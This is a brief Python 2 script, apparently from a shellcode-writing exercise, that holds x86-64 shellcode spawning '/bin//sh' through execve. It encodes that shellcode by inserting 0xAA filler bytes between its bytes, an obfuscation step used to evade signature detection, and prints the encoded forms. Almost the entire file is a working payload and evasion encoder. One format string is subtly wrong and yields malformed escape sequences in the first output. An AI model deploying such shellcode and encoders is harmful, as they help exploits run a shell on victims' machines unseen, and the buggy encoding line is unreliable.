#!/usr/bin/python


# Python Insertion Encoder

shellcode = (\
"\x48\x31\xc0\x48\x31\xdb\xb0\x3b\x53\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x48\x89\xe7\x53\x57\x48\x89\xe6\x53\x48\x89\xe2\x0f\x05")


encoded = ""
encoded2 = ""


print "[*] Encoded Shellcode..."


for byte in bytearray(shellcode):
	encoded += "\\x"
	encoded += "0%2x" % byte
	encoded += "\\x%02x" % 0xAA			# where the insertion happens, adding 0xAA to every byte in between

	encoded2 += "0x"
	encoded2 += "%02x," % byte
	encoded2 += "0x%02x," % 0xAA


print encoded

print encoded2

print "[*] Length: %d" % len(bytearray(shellcode))
